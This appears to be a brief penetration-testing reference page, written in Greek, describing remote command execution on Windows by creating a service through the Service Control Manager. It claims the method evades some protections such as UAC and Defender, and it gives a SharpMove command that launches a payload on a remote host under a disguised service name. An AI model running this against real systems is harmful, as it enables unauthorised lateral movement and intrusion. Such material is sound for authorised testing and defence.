# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** είναι μια τεχνική για την εκτέλεση εντολών σε απομακρυσμένα συστήματα χρησιμοποιώντας τον Διαχειριστή Ελέγχου Υπηρεσιών (SCM) για να δημιουργήσει μια υπηρεσία που εκτελεί την εντολή. Αυτή η μέθοδος μπορεί να παρακάμψει ορισμένους ελέγχους ασφαλείας, όπως τον Έλεγχο Λογαριασμού Χρήστη (UAC) και τον Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
